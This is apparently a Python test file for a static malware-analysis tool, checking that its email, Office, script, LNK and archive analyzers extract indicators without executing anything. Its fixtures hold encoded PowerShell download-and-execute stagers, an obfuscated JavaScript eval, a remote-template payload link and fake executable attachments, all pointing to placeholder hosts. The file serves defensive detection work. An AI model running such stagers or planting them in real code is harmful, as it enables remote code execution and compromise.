"""Tests for bounded delivery-format and script analyzers."""

import base64
import io
import json
import struct
import zipfile

from titan_decoder.core.analyzers.structured import (
    EmailAnalyzer,
    LnkAnalyzer,
    OfficeAnalyzer,
    OptionalArchiveAnalyzer,
    ScriptAnalyzer,
)
from titan_decoder.core.engine import TitanEngine


def test_email_extracts_body_and_attachment_without_execution():
    attachment = base64.b64encode(b"MZ-not-executed http://attachment.example/a")
    message = (
        b"From: sender@example.org\r\n"
        b"To: analyst@example.org\r\n"
        b"Subject: Invoice\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: multipart/mixed; boundary=x\r\n\r\n"
        b"--x\r\nContent-Type: text/plain\r\n\r\nSee http://body.example/\r\n"
        b"--x\r\nContent-Type: application/octet-stream\r\n"
        b"Content-Disposition: attachment; filename=invoice.exe\r\n"
        b"Content-Transfer-Encoding: base64\r\n\r\n" + attachment + b"\r\n--x--\r\n"
    )
    artifacts = EmailAnalyzer().analyze(message)
    names = {name for name, _ in artifacts}
    assert "email_summary.json" in names
    assert "email_body_1.txt" in names
    assert "email_invoice.exe" in names
    report = TitanEngine().run_analysis(message)
    assert "http://attachment.example/a" in report["iocs"]["urls"]


def _ooxml() -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        )
        archive.writestr(
            "word/document.xml",
            "<document><p>Review http://document.example/path</p></document>",
        )
        archive.writestr(
            "word/_rels/document.xml.rels",
            '<Relationships><Relationship TargetMode="External" '
            'Target="https://template.example/payload.dotm"/></Relationships>',
        )
        archive.writestr("word/vbaProject.bin", b"VBA powershell -EncodedCommand")
        archive.writestr("word/embeddings/oleObject1.bin", b"MZ embedded object")
    return output.getvalue()


def test_office_analyzer_reports_macros_relationships_and_embeddings():
    artifacts = OfficeAnalyzer().analyze(_ooxml())
    summary = json.loads(dict(artifacts)["office_summary.json"])
    assert summary["package_type"] == "word"
    assert summary["macro_present"] is True
    assert summary["embedded_objects"] == ["word/embeddings/oleObject1.bin"]
    assert summary["external_relationships"] == [
        "https://template.example/payload.dotm"
    ]
    report = TitanEngine().run_analysis(_ooxml())
    assert "https://template.example/payload.dotm" in report["iocs"]["urls"]


def test_script_analyzer_statically_deobfuscates_powershell_and_javascript():
    command = "IEX (iwr 'http://script.example/stage')"
    encoded = base64.b64encode(command.encode("utf-16-le"))
    script = b"powershell.exe -NoP -EncodedCommand " + encoded
    artifacts = dict(ScriptAnalyzer().analyze(script))
    assert b"http://script.example/stage" in artifacts["powershell_decoded.txt"]
    summary = json.loads(artifacts["script_summary.json"])
    assert "powershell" in summary["languages"]
    assert summary["execution_performed"] is False

    javascript = (
        b"function x(){eval(String.fromCharCode(104,116,116,112)+':%2f%2fjs.example')}"
    )
    artifacts = dict(ScriptAnalyzer().analyze(javascript))
    assert b"http://js.example" in artifacts["javascript_normalized.txt"]


def test_lnk_parser_recovers_target_strings():
    data = bytearray(76)
    data[:4] = b"L\x00\x00\x00"
    data[4:20] = bytes.fromhex("0114020000000000c000000000000046")
    struct.pack_into("<II", data, 20, 0x20, 0x80)
    struct.pack_into("<III", data, 52, 1234, 0, 1)
    data.extend(b"C:\\Users\\Public\\payload.exe\x00http://lnk.example/a\x00")
    artifacts = LnkAnalyzer().analyze(bytes(data))
    summary = json.loads(dict(artifacts)["lnk_metadata.json"])
    assert any("payload.exe" in value for value in summary["strings"])
    assert any("lnk.example" in value for value in summary["strings"])


def test_optional_archive_recognition_fails_closed_without_valid_payload():
    analyzer = OptionalArchiveAnalyzer()
    fake = b"7z\xbc\xaf'\x1c" + b"not a valid archive"
    assert analyzer.can_analyze(fake)
    assert analyzer.analyze(fake) == []
    fake_cab = b"MSCF" + b"not a valid cabinet"
    assert analyzer.can_analyze(fake_cab)
    assert analyzer.analyze(fake_cab) == []


def test_analyzer_metadata_artifacts_are_terminal_but_still_feed_iocs():
    command = (
        "IEX (New-Object Net.WebClient).DownloadString('http://meta.example/a.ps1')"
    )
    encoded = base64.b64encode(command.encode("utf-16-le"))
    script = b"powershell -nop -EncodedCommand " + encoded
    report = TitanEngine().run_analysis(script)
    nodes = report["nodes"]
    summaries = [
        node for node in nodes if node.get("artifact_name") == "script_summary.json"
    ]
    assert summaries
    summary = summaries[0]
    # The analyzer-authored summary is recorded but never fed back through
    # decoders or analyzers, so it stays a childless ANALYZE-terminal node.
    assert summary["method"] == "ANALYZE"
    assert summary["analysis_state"] == "terminal"
    assert "metadata" in summary["termination_reason"]
    assert all(node.get("parent") != summary["id"] for node in nodes)
    # Its preview still contributes to report-level IOC extraction.
    assert "http://meta.example/a.ps1" in report["iocs"]["urls"]


def test_email_attachment_cannot_shadow_the_summary_artifact():
    message = (
        b"From: sender@example.org\r\n"
        b"To: analyst@example.org\r\n"
        b"Subject: Shadow\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: multipart/mixed; boundary=x\r\n\r\n"
        b"--x\r\nContent-Type: application/octet-stream\r\n"
        b"Content-Disposition: attachment; filename=summary.json\r\n\r\n"
        b'{"not": "the analyzer summary"}\r\n--x--\r\n'
    )
    artifacts = EmailAnalyzer().analyze(message)
    names = [name for name, _ in artifacts]
    assert names.count("email_summary.json") == 1
    summary = json.loads(dict(artifacts)["email_summary.json"])
    assert summary["analyzer"] == "email"
    assert "email_summary_2.json" in names


def test_structured_analyzers_are_registered_deterministically():
    names = [analyzer.name for analyzer in TitanEngine().analyzers]
    assert names == sorted(names)
    assert {"Email", "OfficeOOXML", "Script", "WindowsLNK", "OptionalArchive"} <= set(
        names
    )
